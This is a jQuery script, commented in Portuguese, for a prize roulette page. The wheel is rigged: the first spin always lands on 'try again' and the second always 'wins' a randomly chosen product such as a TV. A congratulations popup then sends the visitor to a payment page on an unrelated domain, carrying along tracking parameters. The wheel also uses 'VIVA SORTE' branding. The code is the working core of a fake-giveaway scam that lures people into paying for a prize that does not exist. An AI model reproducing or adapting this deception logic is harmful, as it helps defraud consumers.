$(document).ready(function(){
  let loading = false;
  let selectedProduct = null;

  // 🎯 FUNÇÃO PARA CARREGAR E SELECIONAR PRODUTO ALEATÓRIO
  async function loadRandomProduct() {
    try {
      const response = await fetch('./products.json');
      const products = await response.json();
      
      // Seleciona um produto aleatório
      const randomIndex = Math.floor(Math.random() * products.length);
      selectedProduct = products[randomIndex];
      
      console.log('Produto selecionado:', selectedProduct);
      return selectedProduct;
    } catch (error) {
      console.error('Erro ao carregar produtos:', error);
      // Produto padrão em caso de erro
      return {
        id: 1,
        name: "Samsung Smart TV 55",
        image: "./images/produtos/produto1_tv.png"
      };
    }
  }

  // 🎯 FUNÇÃO PARA DETECTAR GÊNERO DO PRODUTO
  function getProductGender(productName) {
    const name = productName.toLowerCase();
    
    // Palavras femininas específicas
    const feminineWords = ['tv', 'televisão', 'câmera', 'camera', "geladeira"];
    
    // Verifica se contém palavras femininas
    for (let word of feminineWords) {
      if (name.includes(word)) {
        return 'uma';
      }
    }
    
    // Verifica terminações femininas
    if (name.endsWith('a') || name.endsWith('ção') || name.endsWith('dade')) {
      return 'uma';
    }
    
    // Por padrão, masculino
    return 'um';
  }

  // 🎯 SISTEMA DE REDIRECIONAMENTO PERSONALIZADO
  /**
   * Lista das chaves que podem estar salvas no localStorage.
   * (adicione ou remova conforme precisar)
   */
  const STORAGE_KEYS = [
    "utm_source", "utm_source_exp",
    "xcod", "xcod_exp",
    "utm_campaign", "utm_campaign_exp",
    "utm_medium", "utm_medium_exp",
    "utm_content", "utm_content_exp",
    "utm_term", "utm_term_exp"
  ];
  
  /**
   * Lê as chaves do localStorage e devolve só as que têm valor.
   */
  function getParamsFromLocalStorage() {
    const params = {};
    STORAGE_KEYS.forEach((key) => {
      const value = localStorage.getItem(key);
      if (value !== null && value !== "") {
        params[key] = value;
      }
    });
    console.log("Parâmetros vindos do localStorage:", params);
    return params;
  }
  
  /**
   * Recebe a baseURL e um objeto {chave: valor}, devolve url com querystring.
   */
  function buildRedirectUrl(baseUrl, params) {
    const url = new URL(baseUrl);
    Object.entries(params).forEach(([key, value]) => {
      url.searchParams.set(key, value);
    });
    return url.toString();
  }
  
  /**
   * Aciona o redirecionamento.
   */
  function redirectToNextPage() {
    const destination = "https://pay.seucartaoflash.cfd/eApQgz2RD1RgEb7";
    const params      = getParamsFromLocalStorage();
    const finalUrl    = buildRedirectUrl(destination, params);
  
    console.log("URL final:", finalUrl);
  
    const btn = document.getElementById("obter-desconto-btn");
    if (btn) {
      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Redirecionando...';
      btn.disabled  = true;
    }
  
    setTimeout(() => {
      window.location.href = finalUrl;
    }, 0);
  }

  // 🎯 INICIALIZAR PRODUTO ALEATÓRIO E CRIAR ROLETA
  loadRandomProduct().then(product => {
    selectedProduct = product;
    createRouletteSegments();
  });

  function createRouletteSegments() {
    const options = [
      {
        title: `Tente outra vez`,
        subtitle: 'Tente outra vez',
        color: '#2f4eb5',
        retry: true,
        titleSize: '12px',
        subtitleSize: '9px',
        titleColor: '#ffffff',
        subtitleColor: '#e6f0ff',
        retryIcon: '🔄',
        iconSize: '20px',
      },
      {
        title: '50 TÍTULOS',
        subtitle: 'VIVA SORTE',
        color: 'white',
        titleSize: '15px',
        subtitleSize: '13px',
        titleColor: '#2f4eb5',
        subtitleColor: '#2f4eb5',
        image: './images/roleta/porco_viva.png',
        imagePosition: 'bottom',
        imageSize: '45px'
      },
      {
        title: '',
        subtitle: '', 
        color: '#2f4eb5',
        titleSize: '32px',
        subtitleSize: '8px',
        titleColor: '#ffffff',
        image: './images/roleta/produto_2.png',
        imageSize: '65px'
      },
      {
        // 🎯 PRODUTO DINÂMICO - APENAS IMAGEM, SEM TEXTO
        title: '',
        subtitle: '',
        color: '#FFCA00',
        image: selectedProduct.image,
        imageSize: '70px',
        imageOnly: true, // 🎯 Apenas imagem, sem texto
        product: selectedProduct // 🎯 Dados do produto para usar no popup
      },
      {
        title: `Tente outra vez`,
        subtitle: 'Tente outra vez',
        color: 'white',
        retry: true,
        titleSize: '12px',
        subtitleSize: '9px',
        titleColor: '#2f4eb5',
        subtitleColor: '#2f4eb5',
        retryIcon: '🔄',
        iconSize: '20px',
      },
      {
        title: '100 TÍTULOS',
        subtitle: 'VIVA SORTE',
        color: '#2f4eb5',
        titleSize: '15px',
        subtitleSize: '13px',
        titleColor: 'white',
        subtitleColor: 'white',
        image: './images/roleta/porco_viva.png',
        imagePosition: 'bottom',
        imageSize: '45px'
      },
      {
        title: '',
        subtitle: '', 
        color: 'white',
        titleSize: '32px',
        subtitleSize: '8px',
        titleColor: '#ffffff',
        image: './images/roleta/produto_1.png',
        imageSize: '65px'
      }
    ];

    var optionsLength = options.length;
    var angleOption = 360 / optionsLength;
    const chances = [0, 3]; // Primeira vez: índice 0 (Tente outra vez), Segunda vez: índice 3 (Produto)

    // Limpar roleta antes de recriar
    $(".roleta").empty();

    // Criar os segmentos da roleta dinamicamente
    for(var i = 0; i < optionsLength; i++){
      const currOption = options[i];
      
      let classes = `segment segment-${i}`;
      if (currOption.retry) classes += ' retry';
      
      $(".roleta").append(`<div class="${classes}" data-index="${i}"></div>`);
      
      // Aplicar estilos para cada segmento
      $(`.segment-${i}`).css({
        'background-color': currOption.color,
        'transform': `translateX(-50%) rotate(${angleOption * i}deg)`
      });

      // ✨ CONFIGURAÇÕES AVANÇADAS PARA "TENTE OUTRA VEZ"
      if (currOption.retry) {
        const titleSize = currOption.titleSize || '16px';
        const subtitleSize = currOption.subtitleSize || '12px';
        const iconSize = currOption.iconSize || '24px';
        
        const textColor = currOption.textColor;
        const titleColor = textColor || currOption.titleColor || '#ffffff';
        const subtitleColor = textColor || currOption.subtitleColor || '#ffffff';
        
        let retryHtml = '<div class="segment-content">';
        
        if (currOption.image) {
          retryHtml += `<div class="retry-icon">
            <img src="${currOption.image}" alt="Retry" 
                 class="retry-img" 
                 style="width: ${currOption.imageSize || iconSize}; height: ${currOption.imageSize || iconSize};" />
          </div>`;
        } else {
          const retryIcon = currOption.retryIcon || '🔄';
          retryHtml += `<div class="retry-icon" style="font-size: ${iconSize};">${retryIcon}</div>`;
        }
        
        retryHtml += `<div class="segment-text" style="font-size: ${titleSize}; color: ${titleColor}; font-weight: 600; line-height: 1.2;">
          ${currOption.title.split(' ')[0]}<br>
          <span style="font-size: ${subtitleSize}; color: ${subtitleColor}; font-weight: 500;">
            ${currOption.title.split(' ').slice(1).join(' ')}
          </span>
        </div>`;
        
        retryHtml += '</div>';
        $(`.segment-${i}`).html(retryHtml);
      } 
      // Segmentos normais (não retry)
      else {
        let contentHtml = '<div class="segment-content">';
        
        const imagePosition = currOption.imagePosition || 'top';
        const imageSize = currOption.imageSize || '40px';
        const titleSize = currOption.titleSize || '28px';
        const subtitleSize = currOption.subtitleSize || '10px';
        
        const textColor = currOption.textColor;
        const titleColor = textColor || currOption.titleColor || '#ffffff';
        const subtitleColor = textColor || currOption.subtitleColor || '#ffffff';
        
        // 🎯 SE É APENAS IMAGEM (imageOnly = true)
        if (currOption.image && currOption.imageOnly) {
          contentHtml += `<div class="segment-image-only">
            <img src="${currOption.image}" alt="${currOption.title || 'Produto'}" 
                 class="segment-img-full" 
                 style="width: ${imageSize}; height: ${imageSize};" />
          </div>`;
        } 
        // Se tem imagem com texto
        else if (currOption.image) {
          if (imagePosition === 'top') {
            contentHtml += `<div class="segment-image segment-image-top">
              <img src="${currOption.image}" alt="${currOption.title}" 
                   class="segment-img" 
                   style="width: ${imageSize}; height: ${imageSize};" />
            </div>
            <div class="segment-title" style="font-size: ${titleSize}; color: ${titleColor};">${currOption.title}</div>
            <div class="segment-subtitle" style="font-size: ${subtitleSize}; color: ${subtitleColor};">${currOption.subtitle}</div>`;
          } else if (imagePosition === 'bottom') {
            contentHtml += `<div class="segment-title" style="font-size: ${titleSize}; color: ${titleColor};">${currOption.title}</div>
            <div class="segment-subtitle" style="font-size: ${subtitleSize}; color: ${subtitleColor};">${currOption.subtitle}</div>
            <div class="segment-image segment-image-bottom">
              <img src="${currOption.image}" alt="${currOption.title}" 
                   class="segment-img" 
                   style="width: ${imageSize}; height: ${imageSize};" />
            </div>`;
          } else if (imagePosition === 'center') {
            contentHtml += `<div class="segment-title" style="font-size: ${titleSize}; color: ${titleColor};">${currOption.title}</div>
            <div class="segment-image segment-image-center">
              <img src="${currOption.image}" alt="${currOption.title}" 
                   class="segment-img" 
                   style="width: ${imageSize}; height: ${imageSize};" />
            </div>
            <div class="segment-subtitle" style="font-size: ${subtitleSize}; color: ${subtitleColor};">${currOption.subtitle}</div>`;
          }
        } 
        // Apenas texto
        else {
          contentHtml += `<div class="segment-title" style="font-size: ${titleSize}; color: ${titleColor};">${currOption.title}</div>
            <div class="segment-subtitle" style="font-size: ${subtitleSize}; color: ${subtitleColor};">${currOption.subtitle}</div>`;
        }
        
        contentHtml += '</div>';
        $(`.segment-${i}`).html(contentHtml);
      }
    }

    // 🎯 FUNÇÃO PARA GIRAR A ROLETA
    window.spinRoulette = function() {
      if (loading) {
        return;
      }
      loading = true;

      var num = chances[rotated];
      var numID = 'number-' + num;
      
      $('#animacaoRoleta').remove();
      $('head').append('<style id="animacaoRoleta">'+
          '#'+ numID +' { '+
            'animation-name: '+ numID +'; '+
            'animation-duration: 5s; '+
            '-webkit-animation-timing-function: cubic-bezier(0, 0.4, 0.4, 1.04); '+
            'animation-timing-function: cubic-bezier(0, 0.4, 0.4, 1.04); '+
            'animation-fill-mode: forwards; '+
          '} '+
        '@keyframes '+ numID +' {'+
          'from { transform: rotate(0deg); } '+
          'to { transform: rotate('+ (360 * (optionsLength - 1) - angleOption * num) +'deg); }'+
        '}'+
        '</style>'
      );

      $('.roleta').removeAttr('id').attr('id', numID);
      
      // 🎯 DESABILITAR AMBOS OS BOTÕES DURANTE O GIRO
      $('#spin').prop('disabled', true).text('GIRANDO...');
      $('#spin-bottom').prop('disabled', true).text('GIRANDO...');
      
      if (rotated === 0) {
        setTimeout(() => {
          showFailurePopup();
          loading = false;
          // 🎯 REABILITAR AMBOS OS BOTÕES
          $('#spin').prop('disabled', false).text('GIRAR');
          $('#spin-bottom').prop('disabled', false).text('GIRE PARA GANHAR');
        }, 5500);
      } else if (rotated === 1) {
        setTimeout(() => {
          showSuccessPopup();
          loading = false;
          // 🎯 REABILITAR AMBOS OS BOTÕES
          $('#spin').prop('disabled', false).text('GIRAR');
          $('#spin-bottom').prop('disabled', false).text('GIRE PARA GANHAR');
        }, 5500);
      }

      rotated++;
    }
  }

  let rotated = 0;

  function showFailurePopup() {
    $('body').append(`
      <div class="popup-container" id="popup-container-lf2">
        <div class="popup">
          <h2>Uma pena!</h2>
          <img src="https://em-content.zobj.net/source/apple/391/crying-face_1f622.png" alt="sad face" width="130px" />
          <p style="margin-left: 5%; margin-right: 5%;">Você não conseguiu desta vez, mas tem mais uma chance de rodar novamente</p>
          <button class="again-btn" id="again-btn">TENTAR NOVAMENTE</button>
        </div>
      </div>  
    `);
    
    $('#again-btn').on('click', function() {
      $('#popup-container-lf2').addClass('hidden');
      setTimeout(() => {
        $('#popup-container-lf2').remove();
      }, 300);
    });
  }

  function showSuccessPopup() {
    // 🎯 DETECTAR GÊNERO DO PRODUTO
    const gender = getProductGender(selectedProduct.name);
    
    // 🎯 POPUP COM TEXTO PERSONALIZADO
    $('body').append(`
      <div class="popup-container" id="popup-container-lf2">
        <div class="popup success-popup">
          <h2>🎉 Parabéns! Você ganhou!</h2>
          <div class="product-showcase">
            <img src="${selectedProduct.image}" alt="${selectedProduct.name}" class="product-image" />
            <div class="product-info">
              <h3 class="product-name">${selectedProduct.name}</h3>
            </div>
          </div>
          <div class="success-message">
            <p><strong>Sua sorte está brilhando hoje!</strong></p>
            <p>Você foi ${gender === 'uma' ? 'uma das sortudas' : 'um dos sortudos'} a ganhar ${gender} <strong>${selectedProduct.name}</strong>.</p>
            <p>Agora só precisamos confirmar como você deseja receber este prêmio incrível!</p>
          </div>
          <a href="javascript:void(0);" class="again-btn" id="obter-desconto-btn">RESGATAR PRÊMIO</a>
        </div>
      </div>  
    `);

    // 🎯 CONECTAR O BOTÃO AO SISTEMA DE REDIRECIONAMENTO
    $('#obter-desconto-btn').on('click', function() {
      redirectToNextPage();
    });
  }

  // 🎯 EVENT LISTENERS PARA AMBOS OS BOTÕES
  $('#spin').on('click', function() {
    if (window.spinRoulette) {
      window.spinRoulette();
    }
  });

  // 🎯 NOVO EVENT LISTENER PARA O BOTÃO EMBAIXO
  $(document).on('click', '#spin-bottom', function() {
    if (window.spinRoulette) {
      window.spinRoulette();
    }
  });

  $('.roleta').on('click', function() {
    if (window.spinRoulette) {
      window.spinRoulette();
    }
  });

  $(document).on('click', '#again-btn', function() {
    if (window.spinRoulette) {
      window.spinRoulette();
    }
    $(this).closest('.popup-container').addClass('hidden');
    setTimeout(() => {
      $(this).closest('.popup-container').remove();
    }, 300);
  });
});